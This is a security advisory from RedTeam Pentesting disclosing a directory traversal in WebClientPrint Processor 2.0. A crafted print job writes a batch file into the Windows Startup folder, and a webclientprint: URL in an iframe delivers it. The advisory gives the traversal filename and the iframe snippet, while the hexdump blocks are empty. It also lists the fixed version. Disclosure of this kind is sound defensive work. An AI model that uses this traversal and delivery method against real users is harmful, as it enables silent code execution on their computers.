Subject: [RT-SA-2015-008] WebClientPrint Processor 2.0: Remote Code Execution
 via Print Jobs

Advisory: WebClientPrint Processor 2.0: Remote Code Execution via Print Jobs

RedTeam Pentesting discovered that malicious print jobs can be used to
trigger a remote code execution vulnerability in WebClientPrint
Processor (WCPP). These print jobs may be distributed via specially
crafted websites and are processed without any user interaction as soon
as the website is accessed.

Details
=======

Product: Neodynamic WebClientPrint Processor
Affected Versions: 2.0.15.109 (Microsoft Windows)
Fixed Versions: >= 2.0.15.910
Vulnerability Type: Remote Code Execution
Security Risk: high
Vendor URL: http://www.neodynamic.com/
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-008
Advisory Status: published
CVE: GENERIC-MAP-NOMATCH
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH


Introduction
============

Neodynamic's WebClientPrint Processor is a client-side application which
allows server-side applications to print documents on a client's printer
without user interaction, bypassing the browser's print functionality.
The server-side application may be written in ASP.NET or PHP while on
the client-side multiple platforms and browsers are supported.

"Send raw data, text and native commands to client printers without
showing or displaying any print dialog box!" (Neodynamic's website)


More Details
============

Upon installation under Microsoft Windows, WCPP registers itself as a
handler for the "webclientprint" URL scheme. Thus, any URL starting with
"webclientprint:" is handled by WCPP. For example, entering

webclientprint:-about

in the URL bar of a browser opens the about box of WCPP.

In order to automatically print a text file using WCPP, a URL such as
the following is requested (e.g. via JavaScript code or an iframe HTML
tag in a website):

webclientprint:https://example.com/somedir/lorem.txt

The file lorem.txt conforms to Neodynamic's proprietary file format CPJ
and contains the following data:

It was obtained from Neodynamic's online demo website[0]. Briefly, its
structure can be described as follows:

Offset   Size                                                     Usage
-----------------------------------------------------------------------
      0     3                                         magic bytes "cpj"
      3     1                                                   unknown
      4     4         offset "pc" (32 bit LE) for printer configuration
      8     4                   offset "lk" (32 bit LE) for license key
   0x0c     6                          filename/content header "wcpPF:"
   0x12     -    filename and content separated by pipe ("|") character
pc+0x12     -                                     printer configuration
lk+0x12     -                                               license key

In the example above, the file "f230bb7f9e384763a27efc5eb7f3d6fa.TXT"
would be printed on the printer with the name "PDFCreator". The license
key at the end of the file was intentionally redacted. Prior to
printing, the text file with the dummy content is created in the current
user's %TEMP% directory. Typically, this directory is located at:

C:\Users\<user>\AppData\Local\Temp\


Proof of Concept
================

During RedTeam Pentesting's analysis of WCPP it was found that malicious
CPJ files can be crafted that exploit a directory traversal bug in WCPP.
Such an example is given in the following hexdump, showing the file
rce-user.txt:

-----------------------------------------------------------------------

-----------------------------------------------------------------------

In this example the filename is set to

..\..\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RedTeam.bat

which is appended to the %TEMP% directory as follows:

C:\Users\<user>\AppData\Local\Temp\..\..\Roaming\Microsoft\Windows\
Start Menu\Programs\Startup\RedTeam.bat

After resolving the "..\..\" sequence contained in the filename, this
yields the following path:

C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\
Startup\RedTeam.bat

As a consequence, the file content beginning at 0x5a is written to the
file RedTeam.bat in the current user's Startup folder. Therefore,
RedTeam.bat will be executed once the affected user logs in again. As a
proof of concept, a text will be displayed and Windows' calculator is
executed.

On one hand, this exploit can be executed when the following URL is
entered into the URL bar of a browser:

webclientprint:https://example.com/somedir/rce-user.txt

On the other hand, visiting users of a malicious website may be attacked
without user interaction when the webclientprint URL is embedded into an
iframe as follows:

-----------------------------------------------------------------------
<html>
<body>
<iframe src="webclientprint:https://example.com/somedir/rce-user.txt">
</iframe>
</body>
</html>
-----------------------------------------------------------------------

The proof of concept printed above contains no valid license key, so a
notification window is shown when the exploit is executed. However, this
does not prevent successful exploitation. Attackers can easily add a
valid license key (e.g. by buying a license), so the window is not shown
and there is no visual indication of exploitation anymore.

The proof of concept is designed to print using the default printer.
Since WCPP does not seem to know how to print batch files, it exits
silently with the result that a successful attack does not print the
batch file.


Workaround
==========

Affected users should disable the WCPP handler and upgrade to a fixed
version as soon as possible.


Fix
===

Install a WCPP version greater or equal to 2.0.15.910[1].


Security Risk
=============

If a user of WCPP visits an attacker-controlled website, arbitrary code
can be executed on the attacked user's computer. If a valid license key
is provided, there is no visual indication of the ongoing attack.
Furthermore, no user interaction is required to trigger the
vulnerability once a malicious website is visited. It is therefore
estimated that this vulnerability poses a high risk.
